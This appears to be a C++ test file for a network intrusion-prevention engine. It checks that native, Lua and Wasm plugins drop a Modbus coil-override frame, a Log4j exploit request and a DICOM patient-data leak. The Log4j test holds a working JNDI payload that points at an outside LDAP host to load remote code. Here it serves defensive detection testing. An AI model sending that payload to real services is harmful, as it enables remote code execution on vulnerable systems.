#include <iostream>
#include <chrono>
#include <thread>
#include <cassert>
#include <cstring>
#include "sdk/PluginSupervisor.hpp"

using namespace sentinel::sdk;

static void mock_log(int level, const char* sender, const char* msg) {
    const char* lvl_str[] = {"DEBUG", "INFO", "WARN", "ERROR"};
    std::cout << "[" << lvl_str[level] << "] (" << sender << ") " << msg << std::endl;
}

static int mock_drop_ipv4(uint32_t ipv4, uint32_t dur) {
    std::cout << "[MOCK KERNEL] Drop rule issued for IP " << ipv4 << " duration " << dur << "s" << std::endl;
    return 0;
}

static void mock_emit_metric(const char* name, uint64_t val) {
    std::cout << "[MOCK METRIC] " << name << " += " << val << std::endl;
}

static uint64_t mock_time_ns() {
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}

int main() {
    std::cout << "============================================================" << std::endl;
    std::cout << "   SENTINEL 3-TIER EXTENSIBILITY SUITE (NATIVE+LUA+WASM)    " << std::endl;
    std::cout << "============================================================" << std::endl;

    SentinelHostInterface host{};
    host.engine_version = 10000;
    host.log_message = mock_log;
    host.request_ebpf_drop_ip = mock_drop_ipv4;
    host.emit_metric_counter = mock_emit_metric;
    host.get_monotonic_time_ns = mock_time_ns;

    PluginSupervisor supervisor(host, 
                               "/etc/sentinel/plugins.d", 
                               "/etc/sentinel/rules.d",
                               "/etc/sentinel/wasm.d");

    if (!supervisor.initialize()) {
        std::cerr << "[-] Failed to initialize supervisor!" << std::endl;
        return 1;
    }

    std::cout << "[+] Supervisor initialized: " 
              << supervisor.native_loader().active_plugin_count() << " Native | "
              << supervisor.lua_engine().active_rule_count() << " Lua | "
              << supervisor.wasm_sandbox().active_module_count() << " Wasm" 
              << std::endl;

    // -------------------------------------------------------------
    // TEST 1: Tier A - Native C++ Dissector: Modbus FC05 (OVERRIDE -> DROP)
    // -------------------------------------------------------------
    uint8_t modbus_write[] = {
        0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x10, 0xFF, 0x00
    };
    SentinelRawPacket pkt1{};
    pkt1.data = modbus_write;
    pkt1.length = sizeof(modbus_write);
    pkt1.timestamp_ns = mock_time_ns();

    auto t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res1 = supervisor.evaluate_frame(pkt1);
    auto t1 = std::chrono::high_resolution_clock::now();
    auto ns1 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "\n[TEST 1] [Tier A: Native C++] Modbus Coil Override -> Verdict: " 
              << res1.verdict << " (" << res1.threat_name << ") | Latency: " << ns1 << " ns" << std::endl;
    assert(res1.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 2: Tier C - LuaJIT Dynamic Rule: Log4j Exploit Payload -> DROP
    // -------------------------------------------------------------
    const char log4j_payload[] = "GET /?user=${jndi:ldap://10.240.0.99:1389/Exploit} HTTP/1.1\r\n\r\n";
    SentinelRawPacket pkt2{};
    pkt2.data = reinterpret_cast<const uint8_t*>(log4j_payload);
    pkt2.length = std::strlen(log4j_payload);
    pkt2.timestamp_ns = mock_time_ns();

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res2 = supervisor.evaluate_frame(pkt2);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns2 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "[TEST 2] [Tier C: LuaJIT] Log4j JNDI Exploit -> Verdict: " 
              << res2.verdict << " (" << res2.threat_name << ") | Latency: " << ns2 << " ns" << std::endl;
    assert(res2.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 3: Tier B - Wasm Sandbox: DICOM PACS Patient Name Leak -> DROP
    // -------------------------------------------------------------
    uint8_t dicom_buffer[256];
    std::memset(dicom_buffer, 0, sizeof(dicom_buffer));
    // Set DICM magic at offset 128
    dicom_buffer[128] = 'D'; dicom_buffer[129] = 'I'; 
    dicom_buffer[130] = 'C'; dicom_buffer[131] = 'M';
    // Inject Tag (0010, 0010) Patient Name at offset 140
    dicom_buffer[140] = 0x10; dicom_buffer[141] = 0x00; 
    dicom_buffer[142] = 0x10; dicom_buffer[143] = 0x00;

    SentinelRawPacket pkt3{};
    pkt3.data = dicom_buffer;
    pkt3.length = sizeof(dicom_buffer);
    pkt3.timestamp_ns = mock_time_ns();

    t0 = std::chrono::high_resolution_clock::now();
    SentinelDissectorResult res3 = supervisor.evaluate_frame(pkt3);
    t1 = std::chrono::high_resolution_clock::now();
    auto ns3 = std::chrono::duration_cast<std::chrono::nanoseconds>(t1 - t0).count();

    std::cout << "[TEST 3] [Tier B: Wasm Sandbox] DICOM PHI Leak -> Verdict: " 
              << res3.verdict << " (" << res3.threat_name << ") | Latency: " << ns3 << " ns" << std::endl;
    assert(res3.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    std::cout << "\n============================================================" << std::endl;
    std::cout << " [SUCCESS] All 3 Execution Tiers Passed Mitigation Tests!    " << std::endl;
    std::cout << "============================================================" << std::endl;

    supervisor.shutdown();
    return 0;
}
